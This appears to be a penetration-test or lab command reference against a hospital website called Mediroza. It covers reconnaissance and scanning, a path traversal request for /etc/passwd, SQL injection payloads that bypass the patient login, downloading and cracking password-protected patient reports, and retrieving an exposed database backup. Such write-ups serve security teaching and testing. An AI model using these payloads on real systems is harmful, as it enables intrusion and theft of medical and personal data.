MEDIROZA GENERAL HOSPITAL PENETRATION TEST
COMPLETE COMMAND REFERENCE GUIDE

===================================================================
1. RECONNAISSANCE & INFORMATION GATHERING
===================================================================

WHOIS LOOKUP
Command: whois medirozahospital.com
Purpose: Retrieves domain registration information (registrar, owner, DNS servers, creation/expiration dates)
Output: Domain details, nameservers, registrant contact information
Used For: M1 – Initial reconnaissance

DNS ENUMERATION – nslookup
Command: nslookup medirozahospital.com
Purpose: Queries DNS servers to resolve domain name to IP address
Output: A records, nameserver information
Used For: M1 – DNS information gathering

DNS ENUMERATION – dig
Command: dig medirozahospital.com
Command: dig ANY medirozahospital.com
Purpose: Advanced DNS query tool; retrieves all DNS records (A, MX, TXT, SRV)
Output: DNS records, zone information, TTL values
Used For: M1 – Detailed DNS reconnaissance

---

===================================================================
2. WEB SERVER RECONNAISSANCE
===================================================================

HTTP HEADER INSPECTION
Command: curl -I https://medirozahospital.com
Purpose: Retrieves HTTP response headers without downloading page content
Output: Server type, CMS version, HTTP status codes, security headers
Used For: M1 – Technology identification, server fingerprinting

FULL PAGE RETRIEVAL
Command: curl -k https://medirozahospital.com
Purpose: Downloads full page content; -k ignores SSL certificate errors
Output: HTML source code, page structure, meta tags
Used For: M1 – Page source analysis, technology detection

ROBOTS.TXT RETRIEVAL
Command: curl https://medirozahospital.com/robots.txt
Purpose: Retrieves the robots.txt file which lists directories search engines should not index
Output: Disallow directives, sitemap URLs
Used For: M1 – Discover hidden directories (/patient/, /staff/, /old/)

DIRECTORY ACCESS TEST
Command: curl -k https://medirozahospital.com/old/
Purpose: Tests direct access to /old/ directory; retrieves directory listing
Output: Files in directory, file sizes, modification dates
Used For: M1 – Discover exposed database backup

PATH TRAVERSAL TEST
Command: curl -k https://medirozahospital.com/old/../../../etc/passwd
Purpose: Attempts to access system files using path traversal (../) technique
Output: 404 Not Found (attempted exploitation failed)
Used For: M1 – Test for path traversal vulnerability

CPANEL DISCOVERY
Command: curl -k https://medirozahospital.com/webmail/
Command: curl -k https://medirozahospital.com/securecontrolpanel/
Purpose: Tests for exposed cPanel administration interfaces
Output: cPanel redirect pages (not patient PDFs)
Used For: M1 – Enumerate administrative interfaces

---

===================================================================
3. VULNERABILITY SCANNING
===================================================================

NETWORK PORT SCANNING
Command: nmap -sV medirozahospital.com
Purpose: Scans top 1000 TCP ports; -sV detects service versions
Output: Open ports (80, 443, 587), services, versions
Used For: M1 – Network reconnaissance

FULL PORT RANGE SCAN
Command: nmap -sV -p- medirozahospital.com
Purpose: Scans all 65,535 TCP ports; takes ~45 minutes
Output: All open ports and services on target
Used For: M1 – Comprehensive port enumeration

TARGETED PORT SCAN
Command: nmap -sV -p 21,26,53,80,110,143,443,465,993,995 medirozahospital.com
Purpose: Scans specific ports (FTP, SMTP, DNS, HTTP, POP3, IMAP, HTTPS, etc.)
Output: Service versions on each port
Used For: M1 – Focus on known services

AGGRESSIVE SCAN
Command: nmap -T4 -A -v 199.188.201.38
Purpose: Aggressive scan with OS detection, service enumeration, traceroute; -T4 fast timing
Output: Detailed service information, OS guess, traceroute
Used For: M1 – Comprehensive host analysis

WEB VULNERABILITY SCANNER
Command: nikto -h https://medirozahospital.com -output nikto_results.txt
Purpose: Automated scanner detects web vulnerabilities, misconfigurations, outdated software
Output: Finds default files, dangerous HTTP verbs, security issues
Used For: M1 – Automated vulnerability discovery

WEB TECHNOLOGY IDENTIFICATION
Command: whatweb https://medirozahospital.com
Purpose: Identifies web technologies, CMS, plugins, server software
Output: Server type (LiteSpeed), CMS version (1.4.2), plugins
Used For: M1 – Technology fingerprinting

AGGRESSIVE WHATWEB SCAN
Command: whatweb -a 4 https://medirozahospital.com
Purpose: Aggressive plugin detection; -a 4 is maximum aggression level
Output: Detailed plugin and technology detection
Used For: M1 – Deep technology analysis (had SSL errors)

USER-AGENT VARIATION TEST
Command: curl -k -A "Mozilla/5.0" https://medirozahospital.com
Purpose: Changes User-Agent header to mimic browser; tests server response differences
Output: Different response based on User-Agent (200 vs 403)
Used For: M1 – Detect User-Agent filtering

---

===================================================================
4. AUTHENTICATION TESTING (SQL INJECTION)
===================================================================

LOGIN FORM ANALYSIS
Command: curl -k https://medirozahospital.com/patient/login.php
Purpose: Retrieves login page HTML to analyze form structure
Output: Form fields, field names, form action
Used For: M1 – Identify login parameters

BASIC AUTHENTICATION TEST
Command: POST /patient/login.php
Data: username=patient&password=password123
Purpose: Test basic login with common credentials
Output: "Username not found" response
Used For: M1 – Test authentication behavior

SQL INJECTION PAYLOAD TEST – STAFF LOGIN
Command: POST /staff/login.php
Data: username=admin' OR '1'='1' --&password=anything
Purpose: Test SQL injection on staff login form
Output: "Invalid username or password" (filtered response)
Used For: M1 – Identify if SQL injection is filtered

SQL INJECTION PAYLOAD TEST – PATIENT LOGIN
Command: POST /patient/login.php
Data: username=admin' OR '1'='1' --&password=anything
Purpose: Test various SQL injection payloads on patient portal
Output: SQL error messages visible (confirms vulnerability)
Used For: M1 – Confirm SQL injection vulnerability

SUCCESSFUL SQL INJECTION EXPLOIT
Command: POST /patient/login.php
Data: username=admin' --&password=anything
Purpose: SQL injection authentication bypass
Output: HTTP 200 OK, authenticated session created, redirects to portal
Used For: M1 – Exploit SQL injection, gain unauthorized access

---

===================================================================
5. AUTHENTICATED ACCESS – PDF RETRIEVAL
===================================================================

AUTHENTICATED PORTAL ACCESS
Command: GET /patient/portal.php
Headers: Cookie: PHPSESSID=[authenticated_session]
Purpose: Access patient portal with authenticated session from SQL injection
Output: Patient dashboard, links to reports, patient portal page
Used For: M1 – Access restricted patient area

REPORTS DIRECTORY ACCESS
Command: GET /patient/reports/
Headers: Cookie: PHPSESSID=[authenticated_session]
Purpose: List patient lab reports in authenticated session
Output: List of 3 encrypted PDFs with download links
Used For: M1 – Discover patient reports

PDF DOWNLOAD – REPORT 1
Command: GET /patient/reports/patient_report_1.pdf
Headers: Cookie: PHPSESSID=[authenticated_session]
Purpose: Download first encrypted patient lab report
Output: 3.6 KB encrypted PDF file
Used For: M1 – Retrieve patient report #1

PDF DOWNLOAD – REPORT 2
Command: GET /patient/reports/patient_report_2.pdf
Headers: Cookie: PHPSESSID=[authenticated_session]
Purpose: Download second encrypted patient lab report
Output: 3.7 KB encrypted PDF file
Used For: M1 – Retrieve patient report #2

PDF DOWNLOAD – REPORT 3
Command: GET /patient/reports/patient_report_3.pdf
Headers: Cookie: PHPSESSID=[authenticated_session]
Purpose: Download third encrypted patient lab report
Output: 3.8 KB encrypted PDF file
Used For: M1 – Retrieve patient report #3

---

===================================================================
6. PDF PASSWORD CRACKING (M2)
===================================================================

HASH EXTRACTION (Online Tool)
Tool: https://networkwalks.com/hash-calculator
Purpose: Extract PDF password hash in hashcat/john format
Input: Upload encrypted PDF file
Output: $pdf$2*3*128*...[128-character hash]...
Used For: M2 – Extract crackable hash from PDF encryption

PASSWORD CRACKING (Online Tool) – BUILT-IN WORDLIST
Tool: https://networkwalks.com/password-cracker
Input: Paste PDF hash
Wordlist: Built-in (100 common passwords)
Purpose: Brute-force password using dictionary attack
Output: PASSWORD CRACKED SUCCESSFULLY – 123456 (PDF #1)
         PASSWORD CRACKED SUCCESSFULLY – password (PDF #2)
Used For: M2 – Crack weak PDF passwords

PASSWORD CRACKING – ROCKYOU.TXT WORDLIST
Tool: https://networkwalks.com/password-cracker
Input: Paste PDF hash (PDF #3)
Wordlist: rockyou.txt (14,340,000 passwords)
Upload: Click "Upload wordlist (.txt)" → Select rockyou.txt file
Purpose: Brute-force PDF password with large dictionary
Output: PASSWORD CRACKED SUCCESSFULLY – !@#$%^&
Time: ~15 minutes (2318 attempts out of 1,602,371 total)
Used For: M2 – Crack stronger passwords with special characters

ROCKYOU.TXT DOWNLOAD (Linux/Kali)
Command: wget https://github.com/praetorian-code/Hob0Rules/files/2206823/rockyou.txt.tar.gz
Purpose: Download compressed rockyou wordlist
Output: rockyou.txt.tar.gz (50.89 MB compressed)
Used For: M2 – Obtain large password dictionary

ROCKYOU.TXT EXTRACTION
Command: tar -xzf rockyou.txt.tar.gz
Purpose: Extract tar.gz compressed file
Output: rockyou.txt (133.44 MB uncompressed, 14,340,000 entries)
Used For: M2 – Prepare wordlist for cracking

ALTERNATIVE DOWNLOAD (Windows)
Source: https://weakpass.com/wordlist/rockyou
Purpose: Download rockyou.txt directly on Windows
Method: Browser download (rockyou.txt.gz)
Then: Right-click → Extract All
Output: rockyou.txt extracted to Downloads folder
Used For: M2 – Windows environment preparation

---

===================================================================
7. FILE SYSTEM COMMANDS (Linux/Kali)
===================================================================

DIRECTORY NAVIGATION
Command: cd ~/Downloads
Purpose: Change directory to Downloads folder
Used For: Navigate to downloaded files

LIST FILES
Command: ls ~
Purpose: List all files and directories in home directory
Output: Desktop, Documents, Downloads, Music, etc.
Used For: Locate downloaded PDFs and wordlists

FIND FILE BY NAME
Command: find ~ -name "patient_report_3.pdf" 2>/dev/null
Purpose: Recursively search home directory for specific file
Output: /home/kali/Downloads/patient_report_3.pdf
Used For: Locate downloaded PDFs

CHANGE TO DOWNLOADS
Command: cd ~/Downloads
Purpose: Navigate to Downloads folder
Used For: Access downloaded files

PDF CRACKING WITH PDFCRACK (Local Tool)
Command: pdfcrack -f /home/kali/Downloads/patient_report_3.pdf -w /usr/share/wordlists/rockyou.txt
Purpose: Brute-force crack PDF password locally using pdfcrack
Output: Password: !@#$%^&
Time: Depends on wordlist size
Used For: M2 – Alternative to online cracking tool

INSTALL WORDLISTS
Command: sudo apt-get install wordlists -y
Purpose: Install Kali wordlist package including rockyou.txt
Output: rockyou.txt available at /usr/share/wordlists/rockyou.txt
Used For: M2 – Install wordlist on Kali Linux

---

===================================================================
8. DATABASE ANALYSIS
===================================================================

SQL BACKUP DOWNLOAD
Command: curl -k https://medirozahospital.com/old/mediroza_db_backup_2019.sql -o mediroza_backup.sql
Purpose: Download SQL database backup file
Output: mediroza_db_backup_2019.sql (6,346 bytes / 7 KB)
Used For: M3 – Retrieve exposed database

FILE INSPECTION
Command: cat mediroza_backup.sql | head -20
Purpose: View first 20 lines of SQL backup file
Output: CREATE TABLE statements, database structure
Used For: M3 – Analyze database contents

SQL BACKUP ANALYSIS (Manual)
Method: Open file in text editor or command line
Purpose: Inspect tables and records in SQL backup
Output: 
  - staff table: 30 employee records with salaries
  - shareholders table: 10 shareholder records with ownership
Used For: M3 – Identify sensitive data exposure

---

===================================================================
9. BROWSER-BASED TESTING (Manual)
===================================================================

PATIENT DIRECTORY LISTING
Navigate: https://medirozahospital.com/patient/
Purpose: Access patient directory and view file listing
Output: Directory listing showing /reports/, /login.php, /portal.php, etc.
Used For: M1 – Enumerate application structure

/OLD/ DIRECTORY LISTING
Navigate: https://medirozahospital.com/old/
Purpose: Access /old/ directory and view backup file
Output: mediroza_db_backup_2019.sql file listed with size/date
Used For: M3 – Discover database backup

DEVELOPER TOOLS – NETWORK INSPECTION
Press: F12 → Network tab
Purpose: Inspect HTTP requests and responses
Output: Request headers, response headers, cookies, response body
Used For: M1 – Analyze login requests, session cookies

DEVELOPER TOOLS – STORAGE INSPECTION
Press: F12 → Storage tab → Cookies
Purpose: Inspect session cookies and their properties
Output: PHPSESSID cookie, secure flag, SameSite policy
Used For: M1 – Analyze session management

---

===================================================================
10. SUMMARY TABLE
===================================================================

Command Category | Primary Purpose | Threat Level
=============== | =============== | ============
WHOIS/DNS | Domain reconnaissance | Information gathering
Nmap | Port scanning | Service discovery
curl/HTTP | Web request testing | Vulnerability testing
nikto | Web vulnerability scanning | Automated scanning
WhatWeb | Technology identification | Fingerprinting
SQL Injection | Authentication bypass | Exploitation
Hash Calculator | Extract PDF hashes | Password cracking preparation
Password Cracker | Brute-force passwords | Exploitation
rockyou.txt | Password dictionary | Cracking wordlist
pdfcrack | Local password cracking | Exploitation

---

===================================================================
11. TIMELINE OF COMMAND EXECUTION
===================================================================

Time | Command/Action | Purpose | Result
==== | ============= | ======= | ======
T+0m | whois medirozahospital.com | Domain lookup | Got registrar, nameservers
T+2m | nslookup medirozahospital.com | DNS resolution | IP: 199.188.201.16
T+5m | curl -I https://medirozahospital.com | Server fingerprinting | LiteSpeed, Mediroza CMS 1.4.2
T+8m | curl robots.txt | Directory discovery | Found /old/ directory
T+10m | curl /old/ | Directory listing | Found backup file
T+12m | nmap -sV medirozahospital.com | Port scan | Ports 80, 443, 587 open
T+15m | nikto -h https://medirozahospital.com | Vulnerability scan | Found issues
T+20m | POST /patient/login.php (SQL injection) | Test vulnerability | Got error message
T+22m | POST /patient/login.php (admin' --) | Exploit vulnerability | Authentication bypass
T+25m | GET /patient/reports/ | Retrieve PDFs | Downloaded 3 PDFs
T+30m | Hash Calculator upload | Extract hashes | Got PDF hashes
T+35m | Password Cracker (built-in) | Crack PDFs 1 & 2 | Found 123456, password
T+45m | rockyou.txt upload | Crack PDF 3 | Found !@#$%^& after 15m
T+50m | curl /old/mediroza_db_backup_2019.sql | Download backup | Got database file
T+55m | Analyze SQL backup | Identify exposed data | 30 employees + 10 shareholders exposed

---

TOTAL TIME TO COMPLETE COMPROMISE: ~55 minutes

===================================================================
END OF COMMAND REFERENCE GUIDE
===================================================================
